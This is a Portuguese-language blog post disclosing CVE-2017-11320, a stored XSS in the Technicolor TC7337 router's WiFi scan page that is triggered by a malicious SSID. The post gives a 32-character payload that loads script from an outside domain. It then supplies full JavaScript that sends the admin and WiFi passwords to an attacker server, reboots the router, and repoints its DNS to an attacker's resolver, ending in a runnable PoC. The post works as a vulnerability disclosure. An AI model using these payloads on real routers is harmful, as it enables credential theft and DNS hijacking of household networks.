<!DOCTYPE html>
<html>
<style>

		@font-face { font-family: "gohu"; src: url("/gohu.woff") format('woff'); }
		html {
			background: url('/4rt3/g3n3r4t1v3/sketch_220308a/out.gif') no-repeat center/100% fixed;
		}
		body {
			font-family: 'gohu', monospace;
			max-width: 50em;
			margin: 0 auto;
			color: white;
			line-height: calc(1ex / 0.32);
			margin-top: 3em;
		}
		pre {
			font-family: 'gohu', monospace;
			white-space: pre-wrap;
			line-height: 125%;
      		background-color: #111;
    	  	padding: 1em;
		}
		.bg_black {
			background-color: rgb(0,0,0,0.7);
		}
		@media only screen and (max-width:768px) {
			body {
				max-width:100%;
			}
		}
		a:link {
			color: #0a0 ;
		}
		a:visited {
			color: #004100 ;
		}
		td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
		span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
		td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
		span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
		.codehilite .hll { background-color: #0000ff }
		.codehilite { background: #000000; }
		.codehilite .c { color: #00ff00 } /* Comment */
		.codehilite .k { color: #ff0000 } /* Keyword */
		.codehilite .ch { color: #00ff00 } /* Comment.Hashbang */
		.codehilite .cm { color: #00ff00 } /* Comment.Multiline */
		.codehilite .cp { color: #e5e5e5 } /* Comment.Preproc */
		.codehilite .cpf { color: #00ff00 } /* Comment.PreprocFile */
		.codehilite .c1 { color: #00ff00 } /* Comment.Single */
		.codehilite .cs { color: #00ff00 } /* Comment.Special */
		.codehilite .kc { color: #ff0000 } /* Keyword.Constant */
		.codehilite .kd { color: #ff0000 } /* Keyword.Declaration */
		.codehilite .kn { color: #ff0000 } /* Keyword.Namespace */
		.codehilite .kp { color: #ff0000 } /* Keyword.Pseudo */
		.codehilite .kr { color: #ff0000 } /* Keyword.Reserved */
		.codehilite .kt { color: #ee82ee } /* Keyword.Type */
		.codehilite .s { color: #87ceeb } /* Literal.String */
		.codehilite .no { color: #7fffd4 } /* Name.Constant */
		.codehilite .nf { color: #ffff00 } /* Name.Function */
		.codehilite .nv { color: #eedd82 } /* Name.Variable */
		.codehilite .sa { color: #87ceeb } /* Literal.String.Affix */
		.codehilite .sb { color: #87ceeb } /* Literal.String.Backtick */
		.codehilite .sc { color: #87ceeb } /* Literal.String.Char */
		.codehilite .dl { color: #87ceeb } /* Literal.String.Delimiter */
		.codehilite .sd { color: #87ceeb } /* Literal.String.Doc */
		.codehilite .s2 { color: #87ceeb } /* Literal.String.Double */
		.codehilite .se { color: #87ceeb } /* Literal.String.Escape */
		.codehilite .sh { color: #87ceeb } /* Literal.String.Heredoc */
		.codehilite .si { color: #87ceeb } /* Literal.String.Interpol */
		.codehilite .sx { color: #87ceeb } /* Literal.String.Other */
		.codehilite .sr { color: #87ceeb } /* Literal.String.Regex */
		.codehilite .s1 { color: #87ceeb } /* Literal.String.Single */
		.codehilite .ss { color: #87ceeb } /* Literal.String.Symbol */
		.codehilite .fm { color: #ffff00 } /* Name.Function.Magic */
		.codehilite .vc { color: #eedd82 } /* Name.Variable.Class */
		.codehilite .vg { color: #eedd82 } /* Name.Variable.Global */
		.codehilite .vi { color: #eedd82 } /* Name.Variable.Instance */
		.codehilite .vm { color: #eedd82 } /* Name.Variable.Magic */
	
</style>
<head>
  <meta charset="UTF-8">
</head>

<body><div class="bg_black"><h1>Roteador TC7337 : DNS Poisoning através de XSS</h1>
<p>1501632000</p>
<p>Outro post em português, e adivinhem! É sobre a NET!</p>
<h4>TL;DR :</h4>
<blockquote>
<p><strong>CVE-2017–11320 </strong>: XSS Persistente através de SSID malicioso permite roubo de credenciais, reboot do roteador e até DNS Poisoning.</p>
</blockquote>
<p>Tudo começou quando a nossa querida NET decidiu bloquear o acesso a qualquer SSH externo, sim não consigo mais acessar nenhum servidor pela porta 22. Qual seria a solução? Ownar o roteador ! Eu consegui ? Até agora não , mas achei esse XSS.</p>
<p>A vulnerabilidade reside na página de scan de redes WiFi próximas [1](wlscanresults.html) que não faz nenhum tipo de filtragem no SSID das mesmas.</p>
<p><img alt="wlscanresults.html" src="img/1__NUahTOrz5MYD__tCnKgM6oQ.png" />
wlscanresults.html<img alt="Sim, isso é a senha dela" src="img/1__oHmdCZm2qTz9BPlw7DtXsg.jpeg" />
Sim, isso é a senha dela</p>
<p>Quando encontrei essa página, logo peguei o celular da minha namorada e subi um HotSpot com SSID <code>‘&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> e PAM ! Alert na cara. Bem legal e tal, mas um alert não é vulnerabilidade. Um grande problema com o SSID é que ele só aceita 32 carácteres, , então como fazer um XSS que realmente faça alguma coisa com só 32 chars ?</p>
<h3>Tamanho importa</h3>
<p>A forma mais fácil de diminuir o payload é carregando o JavaScript externamente utilizando o ‘src’, algo como :</p>
<pre class="codehilite"><code>            '&gt;&lt;script src=&quot;http://evil.com/&quot;&gt;&lt;/script&gt;
</code></pre>

<p>Mas isso tem 42 carácteres :( Note uma das coisas que posso controlar é o nome do domínio. Então fui caçar o menor domínio que consegui encontrar para comprar. depois de DUAS HORA PROCURANDO eu consegui o domínio 6ks.me , um achado. Estamos agora em 40 carácteres, temos que remover 8. Outra idéia foi remover o “http://” , mas o browser vai tentar acessar 192.168.0.1/6ks.me . Me lembro de algum CTF que o que vem antes de “://” sempre especifica o protocolo a ser usado ( como em vnc:// magnet:// etc:// ) , e caso o protocolo não fosse especificado ele usaria o protocolo atual. Assim, consigo remover o “http:” , faltando retirar 3 chars. A barra no final também não é necessária, 2 chars. Para finalizar, a maioria dos browsers não se importa se você não colocar aspas no atributo.<br />
E com <strong>32 chars cravados</strong> :</p>
<pre class="codehilite"><code>            '&gt;&lt;script src=//6ks.me&gt;&lt;/script&gt;
</code></pre>

<p>Agora conseguimos injetar qualquer JavaScript que precisarmos. Mas o que podemos fazer? Podemos utilizar o <a href="https://developer.mozilla.org/pt-BR/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a> para fazer qualquer requisição para o roteador. Fico fuçando o roteador e vendo as requisições que ele faz e vejo que depois de fazer alguma alteração importante ele faz um request para “rebootinfo.cgi” para reiniciar o modem.</p>
<p>Uma coisa interessante é que no código de todas as páginas existe uma variável chamada “sessionKey” :</p>
<pre class="codehilite"><code>            var sessionKey = '540153280';
</code></pre>

<p>Essa key muda em toda requisição e é passada como parâmetro GET em todos os .cgi , se não for válida ele não realiza a ação. Alguma forma tosca de <a href="https://stackoverflow.com/questions/5207160/what-is-a-csrf-token-what-is-its-importance-and-how-does-it-work#33829607">CSRF Token</a>.</p>
<p>Então antes de fazer a request para “rebootar” o modem, eu preciso fazer outro request para uma página qualquer para pegar a sessionKey. Abaixo o JS à ser injetado no browser :</p>
<pre class="codehilite"><code>function reboot_router() {
    // XSS reiniciar modem
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    // Por quê? Porque é divertido ver um XSS fazer o LED apagar

    xmlhttp=new XMLHttpRequest();
    xmlhttp.open(&quot;GET&quot;, &quot;/resetrouter.html&quot;, false); // GET na interface
    xmlhttp.send();
    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ; // Procurando pelo sessionKey
    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex porque a key está dentro de aspas

    xmlhttp=new XMLHttpRequest();
    xmlhttp.open(&quot;GET&quot;, &quot;/rebootinfo.cgi?sessionKey=&quot;+sessionKey, false); // Requisita a página de reboot com a sessionKey
    xmlhttp.send();
}
</code></pre>

<p>Fuçando mais um pouco encontro a página backupsettings.cmd que nada mais é um XML com todas as configurações do modem, inclusive a senha do WiFi em Base64 e a senha do Administrador em PlainText. O mais legal é que não precisa da sessionKey.</p>
<pre class="codehilite"><code>function get_passwords(attackers_server) {
    // attackers_server = servidor para enviar as credenciais
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    // Pegar a senha do WiFi e a senha do administrador
    // através do backup das configurações

    xmlhttp=new XMLHttpRequest();
    xmlhttp.open(&quot;GET&quot;, &quot;/backupsettings.cmd&quot;, false); // XML da configuração do roteador
    xmlhttp.send();
    var k = xmlhttp.responseText.indexOf(&quot;Admin&quot;) ; // Procurando pela senha do Administrador
    var y = xmlhttp.responseText.indexOf(&quot;KeyPassphrase&quot;) ; // Procurando pela senha do WiFi
    // Adicionando uma imagem na página atual para enviar as credenciais através de GET para o servidor do atacante
    document.write('&lt;img src=&quot;'+attackers_server+'?net='+ encodeURIComponent(xmlhttp.responseText.slice(k,k+100)+xmlhttp.responseText.slice(y,y+80))+'&quot;&gt;'); 
}
</code></pre>

<p>Por fim, mas não menos importante. Alterando o DNS do roteador nós conseguimos <a href="https://en.wikipedia.org/wiki/DNS_spoofing">DNS Poisoning</a>.</p>
<pre class="codehilite"><code>function dns_poisoning(attackers_dns) {
    // attackers_dns = servidor DNS malicioso
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ caralho esse código ta muito feio, desculpa mundo
    // Altera os servidores de DNS para o do atacante

    xmlhttp=new XMLHttpRequest();   
    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.html&quot;, false); 
    xmlhttp.send();
    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ;  // Procurando pelo sessionKey
    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex porque a key está dentro de aspas
    var i_wanip = xmlhttp.responseText.indexOf(&quot;wanip&quot;) ;
    var wanip = xmlhttp.responseText.slice(i_wanip,i_wanip+30).match(/'([^']+)'/)[1] ;
    var i_wansubnet = xmlhttp.responseText.indexOf(&quot;wansubnet&quot;) ; 
    var wansubnet = xmlhttp.responseText.slice(i_wansubnet,i_wansubnet+30).match(/'([^']+)'/)[1] ;
    var i_wangatewayip = xmlhttp.responseText.indexOf(&quot;wangatewayip&quot;) ; 
    var wangatewayip = xmlhttp.responseText.slice(i_wangatewayip,i_wangatewayip+30).match(/'([^']+)'/)[1] ;

    xmlhttp=new XMLHttpRequest();
    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.cgi?enblDhcpClnt=0&amp;wanIpAddress=&quot;+wanip+&quot;&amp;wanIfName=wanbridge&amp;wanSubnetMask=&quot;+wansubnet+&quot;&amp;wanIntfGateway=&quot;+wangatewayip+&quot;&amp;dnsPrimary=&quot;+attackers_dns+&quot;&amp;dnsSecondary=&quot;+attackers_dns+&quot;&amp;sessionKey=&quot;+sessionKey, false);
    xmlhttp.send(); // Fazendo a requisiço para SALVAR as novas configurações do DNS

    // Depois de salvar, precisamos aplicar as configurações, fuck logic

    //Getting a brand NEW SessionKey
    xmlhttp=new XMLHttpRequest();   
    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.html&quot;, false); // GET the DNS Config page
    xmlhttp.send();
    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ;  // Procurando pelo sessionKey
    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex porque a key está dentro de aspas

    xmlhttp=new XMLHttpRequest();   
    xmlhttp.open(&quot;GET&quot;, &quot;/wandnscfg.cmd?sessionKey=&quot;+sessionKey, false); // Aplicando as confs
    xmlhttp.send();
}
</code></pre>

<h3>PoC</h3>
<pre class="codehilite"><code>// Vulnerable URL : https://your.rou.ter.ip/wlscanresults.html
// XSS through SSID : '&gt;&lt;script src=//6ks.me&gt;&lt;/script&gt;   ( Exactly 32 bytes u_u )
//                             ^
//  5char domains are running  |    'src' does not requires quotes , and passing the URL with ony '//' 
//  out, grab yours !          +---&gt; it will cause the browser to make the request with the current protocol,
//                                   which is HTTP , duh
// Below is the content of 6ks.me
// index.html ( which is just a JavaScript actually, but we have to use the index to fit the 32 chars ) :

function get_passwords(attackers_server) {
    // attackers_server = server to send the credentials
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    // XSS to get Admin's login/passwd + Wifi passphrase
    // from backup settings 

    xmlhttp=new XMLHttpRequest();
    xmlhttp.open(&quot;GET&quot;, &quot;/backupsettings.cmd&quot;, false); // GET the Backup XML
    xmlhttp.send();
    var k = xmlhttp.responseText.indexOf(&quot;Admin&quot;) ; // Search for Admin's Login and Password
    var y = xmlhttp.responseText.indexOf(&quot;KeyPassphrase&quot;) ; // Search for Wifi PassPhrase
    // Add a img requesting the attacker website with the leaked passwords in the GET parameters
    document.write('&lt;img src=&quot;'+attackers_server+'?net='+ encodeURIComponent(xmlhttp.responseText.slice(k,k+100)+xmlhttp.responseText.slice(y,y+80))+'&quot;&gt;'); 
}

function reboot_router() {
    // XSS + CSRF reboot router
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    // Why? Because It's fun to watch a XSS doing 'physical' stuff

    xmlhttp=new XMLHttpRequest();
    xmlhttp.open(&quot;GET&quot;, &quot;/resetrouter.html&quot;, false); // GET the page of the reset interface
    xmlhttp.send();
    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ; // Search for the SessionKey, some sort of CSRF Token
    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes

    xmlhttp=new XMLHttpRequest();
    xmlhttp.open(&quot;GET&quot;, &quot;/rebootinfo.cgi?sessionKey=&quot;+sessionKey, false); // Request the reboot page with the CSRF token
    xmlhttp.send();
}

function dns_poisoning(attackers_dns) {
    // attackers_dns = malicious DNS Server
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ holy shit my code is ugly as fuck , sorry world
    // Alter the DNS Config of the Router
    // changing the Primary and Secondary DNS to the attacker's one

    xmlhttp=new XMLHttpRequest();   
    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.html&quot;, false); // GET the DNS Config page
    xmlhttp.send();
    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ; // Search for the SessionKey, some sort of CSRF Token
    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes
    var i_wanip = xmlhttp.responseText.indexOf(&quot;wanip&quot;) ;
    var wanip = xmlhttp.responseText.slice(i_wanip,i_wanip+30).match(/'([^']+)'/)[1] ;
    var i_wansubnet = xmlhttp.responseText.indexOf(&quot;wansubnet&quot;) ; 
    var wansubnet = xmlhttp.responseText.slice(i_wansubnet,i_wansubnet+30).match(/'([^']+)'/)[1] ;
    var i_wangatewayip = xmlhttp.responseText.indexOf(&quot;wangatewayip&quot;) ; 
    var wangatewayip = xmlhttp.responseText.slice(i_wangatewayip,i_wangatewayip+30).match(/'([^']+)'/)[1] ;

    xmlhttp=new XMLHttpRequest();
    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.cgi?enblDhcpClnt=0&amp;wanIpAddress=&quot;+wanip+&quot;&amp;wanIfName=wanbridge&amp;wanSubnetMask=&quot;+wansubnet+&quot;&amp;wanIntfGateway=&quot;+wangatewayip+&quot;&amp;dnsPrimary=&quot;+attackers_dns+&quot;&amp;dnsSecondary=&quot;+attackers_dns+&quot;&amp;sessionKey=&quot;+sessionKey, false);
    xmlhttp.send(); // Send the request to SAVE the Primary and Secondary DNS with the CSRF Token

    //After saving we need to apply the settings. yeah, fuck logic --'

    //Getting a brand NEW SessionKey
    xmlhttp=new XMLHttpRequest();   
    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.html&quot;, false); // GET the DNS Config page
    xmlhttp.send();
    var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ; // Search for the SessionKey, some sort of CSRF Token
    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes

    xmlhttp=new XMLHttpRequest();   
    xmlhttp.open(&quot;GET&quot;, &quot;/wandnscfg.cmd?sessionKey=&quot;+sessionKey, false); // GET the apply DNS page
    xmlhttp.send();
}

// Choose your path !
//get_passwords(&quot;http://evil.domain/&quot;) ;
//reboot_router();
dns_poisoning(&quot;1.3.3.7&quot;)
</code></pre>

<h4>PostMortem</h4>
<ul>
<li>Pretendo ler o UART essa semana ainda para ver se consigo desbloquear a porta</li>
<li>A página vulnerável está toda em inglês, talvez seja default do chip Broadcom, mas não tenho como testar. Teste o seu modem para ver se wlscanresults.html existe, se existir me avisa, e você provavelmente estará vulnerável (:</li>
</ul>
<h3>TimeLine</h3>
<ul>
<li>08/07/2017 — Primeiro Email enviado à Technicolor/NET (Sem Resposta)</li>
<li>16/07/2017 — Segundo Email enviado à Technicolor/NET (Sem Resposta)</li>
<li>18/07/2017 — Terceiro Email enviado à Technicolor/NET (Sem Resposta)</li>
<li>02/08/2017 — Full disclosure : CVE-2017–11320</li>
</ul>
<h3>Refs</h3>
<p>[1] <a href="https://media.blackhat.com/eu-13/briefings/Heiland/bh-eu-13-practical-exploitation-heiland-slides.pdf">https://media.blackhat.com/eu-13/briefings/Heiland/bh-eu-13-practical-exploitation-heiland-slides.pdf</a></p></body><hr>by <a href='https://twitter.com/caioluders'>@caioluders</a></div></html>